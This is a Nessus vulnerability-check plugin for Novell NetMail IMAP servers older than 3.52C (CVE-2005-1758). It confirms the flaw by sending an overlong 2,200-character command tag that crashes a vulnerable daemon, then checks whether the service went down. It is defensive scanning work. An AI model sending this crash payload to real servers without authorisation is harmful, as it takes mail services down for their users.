#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18506);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-1758");
  script_bugtraq_id(13926, 14718);
  script_xref(name:"OSVDB", value:"17238");
  script_xref(name:"OSVDB", value:"17239");

  script_name(english:"Novell NetMail < 3.52C IMAP Agent Multiple Remote Overflows");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by multiple buffer overflows." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Novell NetMail, a messaging and calendaring
system for Windows, Linux, Unix, and NetWare. 

The version of NetMail installed on the remote host is prone to
multiple buffer overflows in its IMAP agent, one when handling long
command tags, the other involving IMAP command continuations." );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/cgi-bin/search/searchtid.cgi?/10097957.htm" );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/filefinder/19357/index.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to NetMail version 3.52C or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for multiple buffer overflows in Novell NetMail's IMAP agent");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencies("find_service1.nasl", "imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("misc_func.inc");
include("imap_func.inc");


# Check the imap server.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
if (get_kb_item("imap/false_imap") || get_kb_item("imap/overflow")) exit(0);


# If it's NetMail...
banner = get_imap_banner(port:port);
if ("NetMail IMAP4 Agent" >< banner) {
  # Try to exploit one of the buffer overflows.

  # Establish a connection.
  soc = open_sock_tcp(port);
  if (soc) {
    s = recv_line(socket:soc, length:1024);
    if (strlen(s)) {
      # An overly-long tag crashes a vulnerable imap daemon.
      #
      # nb: ~2200 seems to be the cutoff for whether it crashes or not.
      c = string(crap(2200), "1");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);

      # If we get a response, it's not vulnerable.
      if (s) {
        c = string("a1 LOGOUT");
        send(socket:soc, data:string(c, "\r\n"));
        s = recv_line(socket:soc, length:1024);
      }
      # Else let's make sure it's really down.
      else {
        sleep(1);
        # Try to reestablish a connection and read the banner.
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc2, length:1024);

        # If we couldn't establish the connection or read the banner,
        # there's a problem.
        if (!soc2 || !strlen(s2)) {
          security_hole(port);
          exit(0);
        }
        close(soc2);
      }
    }
    close(soc);
  }
}
